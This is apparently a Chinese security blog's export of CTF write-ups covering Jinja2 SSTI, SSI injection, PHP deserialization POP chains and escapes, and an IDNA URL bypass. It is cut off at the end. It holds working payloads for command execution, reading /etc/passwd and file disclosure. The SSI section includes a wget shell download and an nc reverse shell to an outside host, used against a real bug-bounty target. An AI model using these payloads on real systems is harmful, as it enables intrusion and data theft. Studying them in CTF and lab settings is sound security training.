总结```[![复制代码](ssti-flak框架/copycode-163428445508020.gif)](javascript:void(0);)----------做题思路：首先找到漏洞存在点。```&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;</code></pre><p>通过这个输出所有类。</p><p>在子类列表中找到可以getshell的类/记住一些常见的可以getshell的函数。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __ 是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__ builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>模板跑循环</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>读取文件payload</p><pre><code>&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>warnings.catch_warnings类在在内部定义了_module=sys.modules[‘warnings’]，然后warnings模块包含有__builtins__，也就是说如果可以找到warnings.catch_warnings类，则可以不使用globals，payload如下</p><pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;</code></pre><p>总而言之，原理都是先找到含有__builtins__的类，然后再进一步利用</p><p>常用脚本：</p><p>我们首先把所有的子类列举出来</p><pre><code>Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...一大堆的子类</code></pre><p>然后把子类列表放进下面脚本中的a中，然后寻找os._wrap_close这个类</p><p>find2.py</p><p><a href="javascript:void(0);"><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码"></a></p><pre><code>import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>[<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/copycode-16342831245848.gif" alt="复制代码">](</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 模板注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssi服务端包含注入</title>
      <link href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>​                                                      ssi服务端包含注入</p><p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p><h1 id="SSI-配置和语法"><a href="#SSI-配置和语法" class="headerlink" title="SSI 配置和语法"></a>SSI 配置和语法</h1><h2 id="启用SSI"><a href="#启用SSI" class="headerlink" title="启用SSI"></a>启用SSI</h2><p>示例：Nginx 配置SSI功能</p><p>在http段中加入下面几句即可：</p><pre><code>ssi on;ssi_silent_errors off;ssi_types text/shtml;</code></pre><p>默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。</p><h2 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h2><p>首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来</p><pre><code class="html">①显示服务器端环境变量&lt;#echo&gt;本文档名称：&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;现在时间：&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;显示IP地址：&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt;**②****将文本内容直接插入到文档中&lt;#include&gt;**&lt;! #include file=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径    ③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)文件最近更新日期：&lt;! #flastmod file=&quot;文件名称&quot;–&gt;文件的长度：&lt;!–#fsize file=&quot;文件名称&quot;–&gt;④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。⑤设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)⑥高级SSI可设置变量使用if条件语句。</code></pre><h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。</p><p>从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：</p><ul><li>文件相关的属性字段</li><li>当前时间</li><li>访客IP</li><li>调用CGI程序</li></ul><h1 id="SSI注入的条件"><a href="#SSI注入的条件" class="headerlink" title="SSI注入的条件"></a>SSI注入的条件</h1><p>当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：</p><ul><li><p>Web 服务器已支持SSI（服务器端包含）</p></li><li><p>Web 应用程序未对对相关SSI关键字做过滤</p></li><li><p>Web 应用程序在返回响应的HTML页面时，嵌入用户输入</p></li><li><p>SSI注入常用命令：</p></li><li><pre><code class="html">例子示例 1用于注入 SSI 的命令因使用的服务器操作系统而异。以下命令表示应用于执行 OS 命令的语法。Linux：列出目录下的文件：&lt;!--#exec cmd=&quot;ls&quot; --&gt;访问目录：&lt;!--#exec cmd=&quot;cd /root/dir/&quot;&gt;执行脚本：&lt;!--#exec cmd=&quot;wget http://mysite.com/shell.txt | rename shell.txt shell.php&quot; --&gt;视窗：列出目录下的文件：&lt;!--#exec cmd=&quot;dir&quot; --&gt;访问目录：&lt;!--#exec cmd=&quot;cd C:\admin\dir&quot;&gt;示例 2可用于访问和设置服务器信息的其他 SSI 示例：要更改错误消息输出：&lt;!--#config errmsg=&quot;File not found, informs users and password&quot;--&gt;显示当前文档文件名：&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt;显示虚拟路径和文件名：&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt;使用“config”命令和“timefmt”参数，可以控制日期和时间输出格式：&lt;!--#config timefmt=&quot;A %B %d %Y %r&quot;--&gt;使用“fsize”命令，可以打印所选文件的大小：&lt;!--#fsize file=&quot;ssi.shtml&quot; --&gt;示例 3IIS 4.0 和 5.0 版本中的一个旧漏洞允许攻击者通过动态链接库（ssinc.dll）中的缓冲区溢出故障来获取系统权限。“ssinc.dll”用于解释进程服务器端包含。 CVE 2001-0506。通过创建包含以下 SSI 代码的恶意页面并强制应用程序加载此页面（路径遍历攻击），可以执行此攻击：ssi_over.shtml&lt;!--#include file=”UUUUUUUU...UU”--&gt;PS：“U”的数量需要大于2049。强制应用程序加载 ssi_over.shtml 页面：非恶意网址：www.vulnerablesite.org/index.asp?page=news.asp恶意网址：www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml如果 IIS 返回空白页，则表明发生了溢出。在这种情况下，攻击者可能会操纵程序流并执行任意代码。</code></pre></li></ul><h1 id="SSI挖掘思路"><a href="#SSI挖掘思路" class="headerlink" title="SSI挖掘思路"></a>SSI挖掘思路</h1><p>两个思路：</p><ul><li>从业务场景来Fuzz，比如获取IP、定位、时间等</li><li>识别页面是否包含.stm,.shtm和.shtml后缀</li><li><a href="https://v.duoyinsu.com/"><strong>伏特分布式漏洞扫描平台</strong></a><strong>已经全面支持SSI检测。</strong></li></ul><p>google dork：’inurl:bin/cklb’</p><h1 id="SSI漏洞复现"><a href="#SSI漏洞复现" class="headerlink" title="SSI漏洞复现"></a>SSI漏洞复现</h1><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>我们使用bWAPP来做漏洞演示环境</p><p>选择：’Server-Side Includes (SSI) Injection’</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"> </p><p>成功执行了代码。</p><pre><code>再使用下exec指令使用cmd作为参数执行服务器端命令：&#39;&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;&#39;</code></pre><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>运气好，刚好遇到个某SRC的。</p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></pre><p>执行命令</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt;</code></pre><p>反弹shell</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h1 id="SSI防御"><a href="#SSI防御" class="headerlink" title="SSI防御"></a>SSI防御</h1><ul><li>关闭服务器SSI功能</li><li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ssi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-Ezpop</title>
      <link href="/2021/10/13/MRCTF2020-Ezpop/"/>
      <url>/2021/10/13/MRCTF2020-Ezpop/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="MRCTF2020-Ezpop"></a>MRCTF2020-Ezpop</h1><p>打开网页，代码如下：</p><pre><code>Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;)&#123;        $this-&gt;source = $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125; </code></pre><p>下面是本题一些魔术方法的介绍：</p><pre><code>__construct 当一个对象创建时被调用，__toString 当一个对象被当作一个字符串被调用。__wakeup() 使用unserialize时触发__get() 用于从不可访问的属性读取数据#难以访问包括：（1）私有属性，（2）没有初始化的属性__invoke() 当脚本尝试将对象调用为函数时触发。</code></pre><p>首先观察敏感函数，在Modifier中发现敏感函数include(),这应该是一个可利用点。问题的关键点就算如何调用Modifier中的include()函数。可以看到里面有一个魔术方法：__invoke(),当脚本尝试将对象调用为函数时触发，那么问题就转化为如何通过构建pop链来触发这个函数。</p><p>Show类中 __ construct并没有什么用。但我们发现了一个敏感点, __ toString魔术方法。它的作用主要就是能echo一个实例化的类（如果这个类没有 __ toString()，则会报错），因为echo时会自动调用__toString()。那么我们看如何才能调用这个魔术方法呢？</p><p>我们发现show类中还有一个过滤：</p><pre><code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code></pre><p>preg_match（）函数用到source，如果source是字符串，则直接拿来匹配。<br> 如果source是一个类且这个类里有__ toString()方法，则会调用__ toString()。</p><p>所以我们应该使source为一个类来调用__ toString 方法。</p><p>source = new Show();</p><p>调用__ toString后会返回这个：</p><pre><code> return $this-&gt;str-&gt;source;</code></pre><p>我们要考虑该如何利用这个。</p><p>如果令 $this-&gt;str = new Test(),Test()类中没有source,则会自动调用 __ get(),返回一个变量加括号，即函数 $p()。如果我们再让$p = new Modifier()。则相当于返回一个类函数，则会调用Modifier的 __invoke() ，用 $var读取flag.php即可.</p><p>payload:</p><pre><code>&lt;?phpclass Modifier &#123;    protected  $var = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;public function __construct($file=&#39;index.php&#39;)&#123;    $this-&gt;str = new Test();    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;&#125;$a = new Show();$a-&gt;source = new Show();$a-&gt;source-&gt;str-&gt;p = new Modifier();echo urlencode(serialize($a));?&gt;</code></pre><p>思考：为什么这里要用urlencode编码进行加密？</p><p>因为$var是protected 类型，序列化后要手动加一些字符才能通过。</p><p>贴一段代码：</p><p><img src="/2021/10/13/MRCTF2020-Ezpop/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY0MjYxMA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0CTF 2016-piapiapia</title>
      <link href="/2021/10/10/0CTF-2016-piapiapia/"/>
      <url>/2021/10/10/0CTF-2016-piapiapia/</url>
      
        <content type="html"><![CDATA[<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h1><p>代码审计还有PHP反序列化一直是我的硬伤，所以想借助这个题目来理一理思路。</p><p>首先，打开网址，如图：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010224803224.png" alt="image-20211010224803224"></p><p>先尝试了万能密码，没有效果。</p><p>sql注入，手工和sqlmap跑半天没有效果，放弃。</p><p>没有什么可以做的，就扫一扫目录。</p><p>python dirsearch.py  -u <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/</a> -e * -s 1 -x 400,403,404,500,503,429 -o C:\Users\Sakura\Desktop\1.txt</p><p>buu扫目录一直容易崩溃，所以要降低dirsearch的扫描速度。</p><p>最终扫描出来了 register.php 和<a href="http://www.zip./">www.zip。</a></p><p>进入 xxx/register.php :<br><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225335750.png" alt="image-20211010225335750"> </p><p>注册账号并登录：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225502569.png" alt="image-20211010225502569"></p><p>考虑了文件上传，上传多次，没有效果，放弃！</p><p>更新文件后，进入这个界面：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225645545.png" alt="image-20211010225645545"></p><p>就此停下，不知道如何进行下一步，决定从源码入手。</p><p>访问 <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/www.zip">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/www.zip</a></p><p>获取到了网站源码。</p><p>进行苦逼的代码审计：</p><p>由上方可知逻辑结构为：register-&gt;login-&gt;update-&gt;profile</p><p>登录和注册可以先不看，由 update-&gt;profile</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225831335.png" alt="image-20211010225831335"></p><p>首先查看config.php，看到了flag但是为空，没有显示,这里要注意下config.php，下面可能会用到。</p><p>继续浏览代码，寻找敏感点：</p><p>在profile.php中发现了两个关键点，unserialize(),file_get_contents()</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p>猜测应该考察PHP反序列化，$profile[‘photo’] 是重点，考虑对其传值，实现flag的读取。</p><p>进一步审计：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230732653.png" alt="image-20211010230732653"></p><p>在update.php中发现了这样一个函数：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230845047.png" alt="image-20211010230845047"></p><p>$profile[‘photo’] = ‘upload/‘ . md5($file[‘name’]);</p><p>发现该值被hash加密了，根本无法对其进行控制。</p><p>既然profile[‘photo’] 无法控制，我们是否可以考虑传入其它值来达到目的。看profile[‘photo’]的上一个参数，profile[‘nickname’]，是否可以通过profile[‘nickname’]传值给profile[‘photo’]呢.</p><p>继续看unserialize($profile)</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010232230667.png" alt="image-20211010232230667"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010232355284.png" alt="image-20211010232355284"></p><p>由此可知，对像user中show_profile()的返回值被反序列化，查看show_porfile函数：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010233728714.png" alt="image-20211010233728714"></p><p>$username首先会被过滤一次，跟进filter()函数：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010235353988.png" alt="image-20211010235353988"></p><p>这里的意思是\会被|替代，一些敏感的sql单词会被hacker代替(上文的select,insert,update,delete,where)</p><p>过滤后，$username会被插入到select语句中：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010235733254.png" alt="image-20211010235733254"></p><p>到此，基本明白了网站的运行逻辑。</p><p>接下来继续从反序列化入手：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230845047.png" alt="image-20211010230845047"></p><p>接上面的思路，由于profile=[‘photo’] 我们无法控制，而fileter过滤，如果存在where则会变为hacker，增加了一个字符，所以考察的知识点应该为字符串增加的PHP反序列化逃逸。这里会对$profile进行序列化。</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011003440679.png" alt="image-20211011003440679"></p><p>修改phpto的值</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011010728666.png" alt="image-20211011010728666"></p><p>要注意，最后还要通过update.php中还存在一个限制：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011011455216.png" alt="image-20211011011455216"></p><p>nickname的长度不可以&gt;10,那该怎么绕过它呢？</p><p>这里就要用到数组了</p><pre><code>md5(Array()) = nullsha1(Array()) = nullereg(pattern,Array()) =nullpreg_match(pattern,Array()) = falsestrcmp(Array(), “abc”) =nullstrpos(Array(),“abc”) = nullstrlen(Array()) = null</code></pre><p>所以nickname传入数组就可以绕过。</p><p>如何将nickname变为数组呢？让我们来看一个例子：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;15885248522&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/9f6e6800cfae7749eb6c486619254b9c&quot;;&#125;</code></pre><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011014313810.png" alt="image-20211011014313810"></p><p>要让 </p><pre><code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>逃逸出来</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011014619609.png" alt="image-20211011014619609"></p><p>34个字符，所以应该有34个where来逃逸34个字符。</p><p>6*34=204</p><pre><code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;15885248522&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/9f6e6800cfae7749eb6c486619254b9c&quot;;&#125;</code></pre><p>所以payload就为：</p><pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>在burp中将nickname类型改为数组，并传入payload</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011015434242.png" alt="image-20211011015434242"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011015942962.png" alt="image-20211011015942962"></p><p>查看源代码，可发现base64加密</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011020008050.png" alt="image-20211011020008050"></p><p>解密即可得到flag</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011020027430.png" alt="image-20211011020027430"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-python-nginx</title>
      <link href="/2021/10/10/SUCTF2019-python-nginx/"/>
      <url>/2021/10/10/SUCTF2019-python-nginx/</url>
      
        <content type="html"><![CDATA[<p>题目源码：</p><pre><code>@app.route(&#39;/getUrl&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;]) def getUrl():   url = request.args.get(&quot;url&quot;)   host = parse.urlparse(url).hostnameif host == &#39;suctf.cc&#39;:   return &quot;我扌 your problem? 111&quot;parts = list(urlsplit(url)) host = parts[1]if host == &#39;suctf.cc&#39;:   return &quot;我扌 your problem? 222 &quot; + host newhost = []for h in host.split(&#39;.&#39;):   newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))   parts[1] = &#39;.&#39;.join(newhost)  # 去掉 url 中的空格   finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]   host = parse.urlparse(finalUrl).hostnameif host == &#39;suctf.cc&#39;:   return urllib.request.urlopen(finalUrl).read()else :  return &quot;我扌 your problem? 333&quot;</code></pre><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>该题的主要问题是在</p><p>h.encode(‘idna’).decode(‘utf-8’)</p><p>IDNA实际上是国际化域名</p><p>什么是IDN?</p><p>国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。</p><p><img src="/2021/10/10/SUCTF2019-python-nginx/1.png"></p><p>Nginx重要配置文件：</p><pre><code>配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf</code></pre><p>利用脚本来跑可用字符：</p><pre><code class="#">for i in range(128,65537):        tmp=chr(i)        try:                res = tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)                if(&quot;-&quot;) in res:                        continue                print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))        except:                pass</code></pre><p><img src="/2021/10/10/SUCTF2019-python-nginx/3.png"><br>发现可利用字符,获取flag：<br><img src="/2021/10/10/SUCTF2019-python-nginx/2.png"></p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>利用两此urlsplit漏洞：<br>这道题不能让他为suctf.cc<br><img src="/2021/10/10/SUCTF2019-python-nginx/5.png"><br>但是经过了 urlunsplit 后变成 